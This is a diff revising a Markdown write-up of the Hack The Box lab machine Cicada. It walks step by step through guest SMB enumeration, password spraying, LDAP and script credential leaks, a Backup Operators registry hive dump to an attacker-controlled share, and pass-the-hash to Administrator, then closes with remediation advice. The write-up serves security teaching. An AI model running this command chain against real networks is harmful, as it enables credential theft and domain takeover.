@@ -1,5 +1,5 @@
 ---
-title: "Cicada: Active Directory Credential Chaining via Guest SMB Access"
+title: "Cicada — Credential Chaining to Backup Operators Hive Extraction"
 description: "Guest SMB, LDAP attributes, and embedded script credentials chain into Backup Operators hive extraction and domain compromise."
 type: case-study
 platform: Hack The Box
@@ -10,25 +10,53 @@ tags:
   - windows
   - active-directory
   - credential-chaining
+objective: "Move from guest SMB access through directory and share credential disclosures to domain administrator"
+tools:
+  - rustscan
+  - netexec
+  - impacket
+  - evil-winrm
+skill: "Active Directory credential discovery and abuse"
+outcome: "Pass-the-hash authentication as the domain Administrator after Backup Operators hive extraction"
 ---
+
+## At a glance
+
+| Field | Value |
+|---|---|
+| Difficulty | Easy |
+| Target environment | Windows Server 2022 Active Directory Domain Controller (build 20348) |
+| Starting position | Unauthenticated network access; SMB guest logon accepted |
+| Objective | Chain credential disclosures across SMB shares, LDAP attributes, and an embedded script to reach domain administrator |
+| Outcome | Pass-the-hash authentication as the domain Administrator |
 
 ## Summary
 
-Cicada is an Easy Windows Active Directory machine on Hack The Box. Guest SMB access exposes an onboarding notice containing a default password. Password spraying identifies a valid domain account. LDAP description fields leak a second credential pair. A development share reveals a backup script embedding a third. The final user holds `Backup Operators` group membership, enabling SAM and SYSTEM hive extraction from the domain controller and recovery of an administrative NTLM hash. The attack chain demonstrates how several low-severity misconfigurations compound into full domain compromise.
+Cicada is an Easy-rated Hack The Box Windows machine that shows how several small credential exposures compound into domain administrative control. Guest SMB access exposes an onboarding notice holding a default password; password spraying maps it to a first domain account; user description attributes and a development-share backup script disclose two further credentials; and the last account's `Backup Operators` membership allows SAM and SYSTEM hive extraction from the domain controller and recovery of an administrative NTLM hash. Credential values, hostnames, and addresses are replaced with role-based placeholders; command syntax is preserved.
+
+**Attack path:** **Guest SMB → onboarding default password → password spray → LDAP description leak → development-share backup script → WinRM → `Backup Operators` hive dump → pass-the-hash Administrator**
 
 ## Context and Objective
 
-The target is a Windows Server 2022 Active Directory Domain Controller. The objective is to obtain administrative access on the domain controller by chaining credential disclosures across SMB shares, LDAP attributes, and embedded script credentials. The exercise is conducted in a controlled Hack The Box lab environment; target-specific identifiers are replaced with role-based placeholders.
+- **Target:** Windows Server 2022 Active Directory Domain Controller (build 20348), host `<DC_HOST>` in domain `<DOMAIN>`.
+- **Exposed services:** DNS (53), Kerberos (88), RPC (135), SMB (139/445), LDAP (389/636/3268/3269), and WinRM (5985); SMB signing is enabled and required.
+- **Starting position:** unauthenticated network access, with the SMB service accepting guest logons.
+- **Objective:** move from guest access to domain administrative control and demonstrate how independent credential leaks chain together.
+- **Constraints:** activity was confined to the Hack The Box lab environment.
 
 ## Approach and Evidence
 
-### Stage 1 — Port Scanning and Service Identification
+The WinRM logon and the final administrative logon are recorded as outcomes without captured console output; every other result below is shown with the output that establishes it.
 
-A port scan reveals standard Active Directory services and identifies the host as a domain controller:
+### 1. Service Enumeration
+
+Observation: a full port scan surfaces the services of a domain controller.
 
 ```bash
 rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN <SCAN_OUTPUT>
 ```
+
+Truncated scan output:
 
 ```text
 PORT     STATE SERVICE       VERSION
@@ -45,42 +73,66 @@ PORT     STATE SERVICE       VERSION
 5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
 ```
 
-The combination of DNS (53), Kerberos (88), LDAP (389/636/3268/3269), and WinRM (5985) confirms a domain controller. SMB signing is enabled and required.
+Follow-up identification places the host as `<DC_HOST>` in domain `<DOMAIN>`, with SMB signing enabled and required.
 
-### Stage 2 — Guest SMB Access and HR Share Disclosure
+Significance: the combination of DNS, Kerberos, LDAP, and WinRM identifies a domain controller, and required SMB signing removes NTLM relay over SMB as a route, pushing the path toward credential recovery rather than coercion.
 
-SMB guest access is accepted. Enumerating shares with null credentials shows the `<ONBOARDING_SHARE>` share is readable:
+Result: a Windows Server 2022 domain controller exposes SMB, LDAP, and WinRM, with SMB signing enforced.
+
+### 2. Guest SMB Access and the Onboarding Notice
+
+Observation: guest logon is accepted and the `<ONBOARDING_SHARE>` share is readable.
 
 ```bash
-nxc smb <DOMAIN_FQDN> -u 'a' -p '' --shares
+nxc smb <DOMAIN> -u 'a' -p '' --shares
 ```
 
 ```text
+SMB  <TARGET_IP>  445  <DC_HOST>  [*] Windows Server 2022 Build 20348 x64
+SMB  <TARGET_IP>  445  <DC_HOST>  [+] <DOMAIN>\a: (Guest)
+SMB  <TARGET_IP>  445  <DC_HOST>  [*] Enumerated shares
+
 Share     Permissions  Remark
 -----     -----------  ------
 ADMIN$                 Remote Admin
 C$                     Default share
 <DEVELOPMENT_SHARE>
-<ONBOARDING_SHARE> READ
+<ONBOARDING_SHARE>  READ
 IPC$      READ         Remote IPC
 NETLOGON               Logon server share
 SYSVOL                 Logon server share
 ```
 
-Spidering the onboarding share downloads a notice containing a default password for new hires:
+Spidering the accessible shares downloads a single onboarding document.
+
+```bash
+nxc smb <DOMAIN> -u 'a' -p '' -M spider_plus -o DOWNLOAD_FLAG=True
+```
+
+```text
+"<ONBOARDING_SHARE>": {
+  "Notice from HR.txt": {
+    "size": "1.24 KB"
+  }
+}
+```
+
+The document carries a default password.
 
 ```text
 Your default password is: <DEFAULT_PASSWORD>
 ```
 
-This password is not tied to a specific username. The next step is domain user discovery.
+Significance: the notice is reachable without authentication, and the password is not tied to a named account, so it is a spray candidate rather than a direct login.
 
-### Stage 3 — RID Brute Forcing and Password Spraying
+Result: guest access discloses a default credential with no associated username.
 
-RID brute forcing via SMB with guest access returns the domain user list:
+### 3. Domain User Enumeration and Password Spray
+
+Observation: RID brute forcing over the guest session enumerates domain accounts.
 
 ```bash
-nxc smb <DOMAIN_FQDN> -u 'a' -p '' --rid-brute \
+nxc smb <DOMAIN> -u 'a' -p '' --rid-brute \
   | awk '/SidTypeUser/' \
   | awk '{print $6}' \
   | awk -F'\\' '{print $2}' > users.txt
@@ -90,7 +142,7 @@ nxc smb <DOMAIN_FQDN> -u 'a' -p '' --rid-brute \
 <DOMAIN_ADMINISTRATOR>
 <GUEST_ACCOUNT>
 <KERBEROS_SERVICE_ACCOUNT>
-<DOMAIN_CONTROLLER_MACHINE_ACCOUNT>
+<DC_MACHINE_ACCOUNT>
 <DOMAIN_USER_1>
 <DOMAIN_USER_2>
 <INITIAL_DOMAIN_USER>
@@ -98,49 +150,126 @@ nxc smb <DOMAIN_FQDN> -u 'a' -p '' --rid-brute \
 <REMOTE_ACCESS_USER>
 ```
 
-Spraying the default onboarding password across all discovered users confirms validity for `<INITIAL_DOMAIN_USER>`:
+The onboarding password is then sprayed across the discovered users.
 
 ```bash
-nxc smb <DOMAIN_FQDN> \
+nxc smb <DOMAIN> \
   -u users.txt \
   -p '<DEFAULT_PASSWORD>' \
   --continue-on-success
 ```
 
 ```text
-SMB  <TARGET_IP>  445  <DOMAIN_CONTROLLER>  [+] <DOMAIN_FQDN>\<INITIAL_DOMAIN_USER>:<DEFAULT_PASSWORD>
+SMB  <TARGET_IP>  445  <DC_HOST>  [+] <DOMAIN>\<INITIAL_DOMAIN_USER>:<DEFAULT_PASSWORD>
 ```
 
-### Stage 4 — LDAP Description Credential Leak
+Significance: one account still used the default onboarding password, and `--continue-on-success` keeps checking after the first hit so every matching account is found in a single pass.
 
-With valid credentials for `<INITIAL_DOMAIN_USER>`, an LDAP query on user description fields reveals a plaintext credential for `<INTERMEDIATE_DOMAIN_USER>`:
+Result: valid domain credentials for `<INITIAL_DOMAIN_USER>`.
+
+### 4. LDAP Description Credential Leak
+
+Observation: with authenticated credentials, LDAP user description attributes are readable.
 
 ```bash
-nxc ldap <DOMAIN_FQDN> \
+nxc ldap <DOMAIN> \
   -u '<INITIAL_DOMAIN_USER>' \
   -p '<DEFAULT_PASSWORD>' \
   -M get-desc-users
 ```
 
 ```text
-User: <INTERMEDIATE_DOMAIN_USER> description: <INTERMEDIATE_USER_CREDENTIAL>
+User: <INTERMEDIATE_DOMAIN_USER> description: <INTERMEDIATE_USER_PASSWORD>
 ```
 
-### Stage 5 — DEV Share Credential Disclosure
+Significance: a description attribute stores a plaintext password that any authenticated domain user can read, turning directory metadata into a credential store.
 
-Authenticating as `<INTERMEDIATE_DOMAIN_USER>` grants read access to the development share, which contains a PowerShell backup script. The script embeds credentials for `<REMOTE_ACCESS_USER>`:
+Result: a second account's password is disclosed through LDAP.
+
+### 5. Development Share Credential Disclosure
+
+Observation: the leaked credential grants read access to the development share that guest access could not read.
+
+```bash
+nxc smb <DOMAIN> \
+  -u '<INTERMEDIATE_DOMAIN_USER>' \
+  -p '<INTERMEDIATE_USER_PASSWORD>' \
+  --shares
+```
+
+```text
+Share     Permissions  Remark
+-----     -----------  ------
+ADMIN$                 Remote Admin
+C$                     Default share
+<DEVELOPMENT_SHARE>  READ
+<ONBOARDING_SHARE>   READ
+IPC$      READ         Remote IPC
+NETLOGON  READ         Logon server share
+SYSVOL    READ         Logon server share
+```
+
+Spidering the shares as this account retrieves a PowerShell backup script.
+
+```bash
+nxc smb <DOMAIN> \
+  -u '<INTERMEDIATE_DOMAIN_USER>' \
+  -p '<INTERMEDIATE_USER_PASSWORD>' \
+  -M spider_plus -o DOWNLOAD_FLAG=True
+```
+
+```text
+"<DEVELOPMENT_SHARE>": {
+  "Backup_script.ps1": {
+    "size": "601 B"
+  }
+}
+```
+
+The script embeds a credential pair.
 
 ```powershell
 $username = "<REMOTE_ACCESS_USER>"
-$password = ConvertTo-SecureString "<EMILY_CREDENTIAL>" -AsPlainText -Force
+$password = ConvertTo-SecureString "<REMOTE_ACCESS_PASSWORD>" -AsPlainText -Force
 $credentials = New-Object System.Management.Automation.PSCredential($username, $password)
 ```
 
-Validating these credentials confirms access to the `ADMIN$` share (read) and `C$` share (read/write), along with WinRM access on port 5985.
+Validating the embedded credential through SMB shows broader access, including write access to `C$`.
 
-### Stage 6 — WinRM Access and Backup Operators Membership
+```bash
+nxc smb <DOMAIN> \
+  -u '<REMOTE_ACCESS_USER>' \
+  -p '<REMOTE_ACCESS_PASSWORD>' \
+  --shares
+```
 
-WinRM access as `<REMOTE_ACCESS_USER>` provides an interactive shell. Group membership inspection shows membership in both `Remote Management Users` and `Backup Operators`:
+```text
+Share     Permissions  Remark
+-----     -----------  ------
+ADMIN$    READ         Remote Admin
+C$        READ,WRITE   Default share
+<DEVELOPMENT_SHARE>
+<ONBOARDING_SHARE>  READ
+IPC$      READ         Remote IPC
+NETLOGON               Logon server share
+SYSVOL                 Logon server share
+```
+
+Significance: a service credential embedded in a backup script left on a readable share was disclosed; the exposed WinRM service on port 5985 makes the recovered credential directly usable for interactive logon.
+
+Result: the leaked credential is validated through SMB and can also reach WinRM.
+
+### 6. WinRM Access and Backup Operators Membership
+
+Observation: the recovered credential authenticates over WinRM, and group enumeration in that session reveals the account's rights.
+
+```bash
+evil-winrm -i <DOMAIN> \
+  -u '<REMOTE_ACCESS_USER>' \
+  -p '<REMOTE_ACCESS_PASSWORD>'
+```
+
+Group-membership enumeration returned two security groups:
 
 ```text
 memberof : {
@@ -149,26 +278,36 @@ memberof : {
 }
 ```
 
-`Remote Management Users` explains the WinRM access. `Backup Operators` is the privilege escalation path: members can read protected files for backup purposes, including registry hives on a domain controller.
+Significance: `Remote Management Users` explains the WinRM logon, while `Backup Operators` grants the right to read protected files for backup purposes — including registry hives on a domain controller — which is the intended escalation path.
 
-### Stage 7 — Backup Operators Hive Dump and Administrator Access
+Result: an interactive remote session whose account holds `Backup Operators` rights.
 
-The Backup Operators privilege is abused to extract the SAM and SYSTEM hives from the domain controller:
+### 7. Backup Operators Hive Extraction
+
+Observation: `Backup Operators` rights allow protected registry hives to be copied; an attacker-controlled SMB share receives them.
 
 ```bash
 impacket-smbserver share . -smb2support
 ```
 
+The helper binary, staged from the attacker host, is run within the WinRM session and writes the hives to that share:
+
 ```powershell
-.\<BACKUP_OPERATOR_TOOL> -t \\<DOMAIN_CONTROLLER_FQDN> -o \\<ATTACKER_IP>\<SHARE_NAME>\
+.\<BACKUP_OPERATOR_TOOL> -t \\<DC_HOST>.<DOMAIN> -o \\<ATTACKER_HOST>\<SHARE_NAME>\
 ```
 
 ```text
-Dumping SAM hive to \\<ATTACKER_IP>\share\SAM
-Dumping SYSTEM hive to \\<ATTACKER_IP>\share\SYSTEM
+Dumping SAM hive to \\<ATTACKER_HOST>\<SHARE_NAME>\SAM
+Dumping SYSTEM hive to \\<ATTACKER_HOST>\<SHARE_NAME>\SYSTEM
 ```
 
-Offline extraction of the administrative NTLM hash from the recovered hives:
+Significance: backup rights bypass the file ACLs that normally protect the hives, so credential material is copied without accessing LSASS and without leaving persistent tooling on the host.
+
+Result: the SAM and SYSTEM hives are written to the attacker-controlled share.
+
+### 8. Administrator Hash Extraction and Pass-the-Hash
+
+Observation: the recovered hives are parsed offline.
 
 ```bash
 impacket-secretsdump -sam SAM -system SYSTEM LOCAL
@@ -181,40 +320,49 @@ impacket-secretsdump -sam SAM -system SYSTEM LOCAL
 <DOMAIN_ADMINISTRATOR>:500:<LM_HASH>:<ADMIN_NTLM_HASH>:::
 ```
 
-Pass-the-hash authentication with the recovered administrative NTLM hash yields full domain administrative access:
+The recovered NTLM hash then authenticates over WinRM without a password.
 
 ```bash
-evil-winrm -i <DOMAIN_FQDN> \
+evil-winrm -i <DOMAIN> \
   -u <DOMAIN_ADMINISTRATOR> \
   -H <ADMIN_NTLM_HASH>
 ```
 
+Significance: the local Administrator hash supports pass-the-hash over WinRM, so the password is never needed to obtain an administrative session.
+
+Result: administrative access as the domain Administrator.
+
 ## Challenges and Decisions
 
-The primary challenge was not technical complexity but recognizing the credential chain. Each stage required a different technique (guest enumeration, LDAP attribute querying, share spidering, script analysis, registry hive extraction), and the link between stages was always a credential disclosure in an unexpected location — an HR notice, an LDAP description, and a backup script. The default HR password applied only to one user out of several, requiring a spray to identify the valid account rather than assuming a 1:1 mapping.
+| Challenge | Decision | Rationale |
+|---|---|---|
+| The onboarding password was not tied to a named account | Enumerate domain users, then spray the password | A direct login was not possible, so the valid account had to be identified across the user list |
 
 ## Outcome
 
-The exercise demonstrates full domain compromise through five chained credential disclosures:
-
-1. Guest SMB → onboarding default password
-2. Default password → `<INITIAL_DOMAIN_USER>` (password spray)
-3. `<INITIAL_DOMAIN_USER>` → `<INTERMEDIATE_DOMAIN_USER>` (LDAP description leak)
-4. `<INTERMEDIATE_DOMAIN_USER>` → `<REMOTE_ACCESS_USER>` (development-share backup script)
-5. `<REMOTE_ACCESS_USER>` → `<DOMAIN_ADMINISTRATOR>` (Backup Operators hive dump)
-
-No single misconfiguration is critical in isolation. The compound effect of guest access, stale credentials, credential leakage in directory attributes, plaintext credentials in scripts, and over-privileged backup rights results in complete domain takeover.
+The evidence establishes administrative control of the domain controller reached without exploiting a software vulnerability — each access change after the initial guest logon follows from a credential recovered in a prior step. Recovered credentials are validated through SMB or WinRM before use, and the escalation is proven by the hive-dump output and the offline hash extraction. The two interactive sessions are recorded outcomes rather than captured transcripts, and the exercise is confined to the Hack The Box lab.
 
 ## Lessons and Recommendations
 
-- **Disable guest/null SMB access.** Guest access should not be available on production domain controllers. Regularly audit which shares are accessible without authentication.
-- **Enforce immediate default password rotation.** Onboarding documents containing default passwords should trigger automatic forced password change during account provisioning. Default passwords that remain valid after first login create a persistent spray target.
-- **Sanitize AD description fields.** User description fields are readable by any authenticated domain user. Credentials, notes, or sensitive strings in these fields are effectively shared secrets. Monitor and restrict writes to directory attributes.
-- **Eliminate plaintext credentials in scripts.** The backup script embedded a password in plaintext. Use managed service accounts (gMSA), Windows Credential Manager, or a secret management solution instead of embedded credentials.
-- **Restrict Backup Operators membership.** Members of `Backup Operators` can read protected system files. Do not combine this privilege with interactive remote login rights (WinRM) unless operationally required and separately monitored.
-- **Monitor for credential spraying patterns.** A single password attempted across multiple accounts is a detectable indicator. Implement alerting for repeated authentication failures across a user list.
+No remediation was tested in this lab; the entries below are recommendations.
+
+1. **Guest SMB access on a domain controller.** Root cause: the domain controller accepts guest SMB logons and exposes a readable share. Demonstrated impact: an unauthenticated party retrieved onboarding material. *Recommendation:* disable guest and null SMB sessions and audit shares reachable without authentication. *Detection:* alert on guest authentications and on share enumeration from anonymous sessions.
+2. **A default onboarding password left valid.** Root cause: a shared onboarding document distributed a default password that was never forced to rotate. Demonstrated impact: the password unlocked a live domain account through spraying. *Recommendation:* force a password change at first logon and avoid publishing reusable default credentials. *Detection:* flag accounts that authenticate with a provisioned default.
+3. **Credentials in LDAP description attributes.** Root cause: a plaintext password stored in a user's description attribute. Demonstrated impact: any authenticated domain user could read the credential. *Recommendation:* remove secrets from directory attributes and restrict who can write to them. *Detection:* monitor description fields for credential-like strings.
+4. **Plaintext credentials in a script on a readable share.** Root cause: a backup script embedded a password and sat on a share readable by an ordinary account. Demonstrated impact: the service credential was disclosed. *Recommendation:* use group managed service accounts or a secret store instead of embedded credentials, and tighten share permissions. *Detection:* scan share content for embedded secrets.
+5. **Backup Operators combined with interactive remote logon.** Root cause: the same account held backup rights and WinRM access. Demonstrated impact: registry hive extraction enabled pass-the-hash to the Administrator. *Recommendation:* separate backup membership from remote interactive logon, and monitor privileged hive access.
 
 ## References
 
-- Hack The Box — [Cicada](https://app.hackthebox.com/machines/Cicada) machine.
-- MITRE ATT&CK: T1078 (Valid Accounts), T1552.006 (Credentials In Files), T1003.002 (Security Account Manager).
+- [Hack The Box — Cicada](https://app.hackthebox.com/machines/Cicada) (retired machine)
+- [RustScan](https://github.com/bee-san/RustScan) (fast port scanner)
+- [NetExec](https://github.com/Pennyw0rth/NetExec) (SMB and LDAP enumeration, RID brute force, and share spidering)
+- [Impacket](https://github.com/fortra/impacket) (SMB server, remote registry hive dumping, and `secretsdump` parsing)
+- [evil-winrm](https://github.com/Hackplayers/evil-winrm) (WinRM shell, including hash-based authentication)
+- [MITRE ATT&CK T1078 — Valid Accounts](https://attack.mitre.org/techniques/T1078/)
+- [MITRE ATT&CK T1552.001 — Unsecured Credentials: Credentials In Files](https://attack.mitre.org/techniques/T1552/001/)
+- [MITRE ATT&CK T1003 — OS Credential Dumping](https://attack.mitre.org/techniques/T1003/)
+- [Active Directory Security Groups — Backup Operators (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups)
+- [Control SMB signing behavior (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-signing)
+- [Network access: Restrict anonymous access to Named Pipes and Shares (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-access-restrict-anonymous-access-to-named-pipes-and-shares)
+- [Enable insecure guest logons in SMB2 and SMB3 (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/storage/file-server/enable-insecure-guest-logons-smb2-and-smb3)
